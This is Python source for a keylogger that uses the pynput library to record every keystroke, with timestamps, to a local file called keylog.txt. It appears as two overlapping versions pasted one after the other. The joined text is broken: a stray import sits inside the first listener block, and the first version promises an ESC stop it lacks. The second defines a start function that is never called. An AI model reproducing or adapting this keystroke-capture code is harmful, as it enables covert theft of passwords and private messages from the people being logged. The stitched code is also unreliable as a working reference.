from pynput import keyboard
import logging

# Log file setup
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    print(f"Keylogger is running... Press ESC to stop.")
    listener.join()
    import logging
from pynput import keyboard

log_file = "keylog.txt"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

    # Stop the listener when ESC is pressed
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger...")
        return False  # Returning False stops the listener

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
